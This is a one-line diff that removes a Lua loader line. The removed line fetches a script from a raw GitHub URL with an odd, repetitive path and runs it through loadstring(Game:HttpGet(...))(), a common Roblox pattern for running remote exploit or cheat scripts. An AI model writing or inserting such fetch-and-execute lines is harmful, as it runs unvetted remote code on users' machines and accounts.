@@ -1,1 +1,0 @@
-loadstring(Game:HttpGet("https://raw.githubusercontent.com/Voidraidlo/HAx1PoSLChmVCsGrau2MyueWLZXLaguYHAx1PoSLChmVCsGrau2MyueWLZXLaguYHAx1PoSLChmVCsGrau2MyueWLZXLaguYHAx1/main/RKROP.lua.txt"))()
